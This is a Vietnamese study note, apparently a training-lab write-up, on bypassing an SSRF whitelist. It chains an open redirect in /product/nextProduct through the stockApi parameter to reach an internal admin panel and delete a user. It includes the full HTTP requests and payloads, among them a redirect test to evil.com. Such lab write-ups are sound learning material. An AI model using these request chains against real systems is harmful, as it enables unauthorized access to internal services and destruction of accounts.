![[lab-ssrf-open-redirect.png]]
mượn redirect /product/nextProduct để vòng qua whitelist vào admin nội bộ

> [!NOTE] phân tích đề
> - stockApi bị giới hạn chỉ gọi local app
> - đánh thẳng tới 192.168.0.12:8080 => tạch
> - nhưng có chức năng next product
> - param path chui thẳng vào Location header
> -> open redirect
> - backend lại tự follow redirect mà không check lại
> -sau khi quan sát 2 endpoint này, mình thấy whitelist chặn stockApi ra ngoài nhưng lại có 1 endpoint redirect đi đâu cũng được, nên mình chain: stockApi trỏ vào open redirect, open redirect đá tiếp ra admin nội bộ.
> -> đọc thêm ở [[Hướng tư duy khai thác SSRF]] và [[lys thuyet SSRF]]

### hướng giải
- [ ] thử stockApi tới 192.168.0.12:8080/admin => thấy bị chặn
- [ ] bấm next product, bắt GET /product/nextProduct?path=...
- [ ] thử path=http://evil.com => thấy 302 Location về evil.com
- [ ] nhét redirect URL vào stockApi
- [ ] sửa path tới /admin rồi tới delete carlos

### giải
tìm redirect:
```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
```
-> response:
```http
HTTP/1.1 302 Found
Location: /product?productId=2
```

thử URL ngoài:
```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/1.1
```
-> response:
```http
HTTP/1.1 302 Found
Location: http://192.168.0.12:8080/admin
```
=> open redirect confirm

chain vào stockApi:
```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
-> filter thấy path local => cho qua
-> backend fetch local => gặp 302 => follow tới internal
-> response trả về HTML admin

bắn nốt delete:
```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
=> carlos bị xóa
=> lab solved

![[lab-ssrf-open-redirect-result.png]]

> [!NOTE] bài học
> - whitelist chỉ check URL đầu, không check sau redirect là toang
> - open redirect trên domain trust = chìa khóa bypass SSRF
> - nên mình luôn kiếm redirect khi thấy stockApi bị giới hạn local
